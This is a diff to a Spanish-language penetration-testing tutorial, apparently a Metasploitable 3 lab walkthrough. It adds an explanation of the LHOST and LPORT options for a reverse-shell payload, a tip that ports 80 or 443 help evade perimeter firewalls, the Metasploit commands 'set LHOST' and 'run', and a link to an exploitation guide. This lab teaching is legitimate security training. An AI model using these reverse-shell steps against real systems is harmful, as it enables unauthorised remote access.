@@ -98,9 +98,20 @@ show options
 ![opciones del payload](../img/180820221245.png)
 
 * *LHOST*: Obligatoria. Siempre es la máquina que ataca, y a la que se conectará la shell inversa cuando el payload se active. En nuestro caso es la máquina ***Kali***, así que debemos poner en ella su IP (***192.168.20.9***)
-* *LPORT*: Obligatoria. Es el puerto de escucha que abrirá la máquina ***Kali***, y al que se conectará la shell inversa del payload. Para que los perimetrales no presenten impedimentos, se podría poner en valor ***80*** o, mejor ***443***.
+* *LPORT*: Obligatoria. Es el puerto de escucha que abrirá la máquina ***Kali***, y al que se conectará la shell inversa del payload. Para que los perimetrales no presenten impedimentos, se podría poner en valor ***80*** o, mejor ***443***. Como en el laboratorio no hay este tipo de impedimentos, dejamos el valor propuesto.
+```
+set LHOST 192.168.20.9
+```
+
+Iniciamos el ataque.
+```
+run
+```
 
 
+
+
+https://stuffwithaurum.com/2020/04/17/metasploitable-3-linux-an-exploitation-guide/
 
 
 
